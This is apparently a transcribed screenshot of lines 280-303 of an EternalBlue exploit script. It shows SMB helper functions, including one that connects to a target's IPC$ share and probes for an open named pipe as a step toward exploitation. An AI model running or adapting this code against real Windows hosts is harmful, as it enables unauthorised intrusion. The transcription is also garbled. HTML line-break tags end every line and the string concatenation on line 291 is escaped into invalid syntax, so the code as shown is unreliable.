![](bbox=[0.13, 0.09, 0.87, 0.43])

```
eternalblue.py  
280    def calc_alloc_size(size, align_size):<br>
281        return (size + align_size - 1) & ~(align_size-1)<br>
282<br>
283    def wait_for_request_processed(conn):<br>
284        #time.sleep(0.05)<br>
285        # send echo is faster than sleep(0.05) when connection is very good<br>
286        conn.send_echo('a')<br>
287<br>
288    def find_named_pipe(conn):<br>
289        pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]<br>
290<br>
291        tid = conn.tree_connect_andx('\\\\'\+conn.get_remote_host()\+'\\'IPC$')<br>
292        found_pipe = None<br>
293        for pipe in pipes:<br>
294            try:<br>
295                fid = conn.nt_create_andx(tid, pipe)<br>
296                conn.close(tid, fid)<br>
297                found_pipe = pipe<br>
298            except smb.SessionError as e:<br>
299                pass<br>
300<br>
301        conn.disconnect_tree(tid)<br>
302        return found_pipe<br>
303
```